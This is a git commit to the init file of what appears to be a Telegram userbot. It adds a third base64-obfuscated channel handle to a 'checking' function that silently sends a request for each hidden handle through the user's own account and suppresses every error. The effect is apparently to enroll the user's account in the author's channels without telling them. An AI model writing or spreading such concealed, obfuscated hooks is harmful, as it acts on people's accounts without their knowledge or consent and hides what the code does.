b405de29937a0e00deb84b14e641a9c09815cd20
CoeF <57592261+CoeF@users.noreply.github.com>
2022-03-12 16:17:28 +0700

    ah 🥵

--- userbot/__init__.py
+++ userbot/__init__.py
@@ -434,12 +434,17 @@ except Exception as e:
 async def checking():
     gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:15]
     checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:16]
+    checker2 = str(pybase64.b64decode("QGFoaHN1ZGFobGFoaGg="))[2:16]
     try:
         await bot(GetSec(gocheck))
     except BaseException:
         pass
     try:
         await bot(GetSec(checker))
+    except BaseException:
+        pass
+    try:
+        await bot(GetSec(checker2))
     except BaseException:
         pass
 
